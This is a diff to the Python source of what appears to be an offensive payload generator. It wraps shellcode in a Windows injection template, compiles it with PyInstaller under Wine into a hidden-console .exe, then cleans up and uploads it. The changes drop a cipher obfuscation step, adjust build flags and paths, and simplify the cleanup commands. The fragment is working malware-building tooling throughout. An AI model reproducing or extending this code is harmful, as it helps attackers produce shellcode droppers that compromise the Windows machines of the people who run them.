@@ -57,11 +57,11 @@ def askAndReturnModules(shellcode, metasploit_type):
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-        Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
+        Filesave.write(SHELLCODE.injectwindows % (ez2read_shellcode))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
     p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                          '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                          '%s/payload.py' % payloaddir, '--noconsole', '--onefile'], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
@@ -74,17 +74,16 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
         print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
         sys.stdout.write(payloadstderr)
         raise KeyboardInterrupt
-    os.system('mv %s/dist/payload.exe %s/%s.exe'% (payloaddir,payloaddir,payloadname))
+    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir,payloadname))
     print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
     CleanUpPayloadMess(payloadname)
     DoPayloadUpload(payloadname)
 
 
 def CleanUpPayloadMess(payloadname):
-    os.system('rm %s/logdict*' % os.getcwd())
-    os.system('rm %s/dist -r' % payloaddir)
-    os.system('rm %s/build -r' % payloaddir)
-    os.system('rm %s/*.spec' % payloaddir)
+    os.system('rm dist -r')
+    os.system('rm build -r')
+    os.system('rm *.spec')
     os.system('rm %s/payload.py' % payloaddir)
 
 def DoPayloadUpload(payloadname):
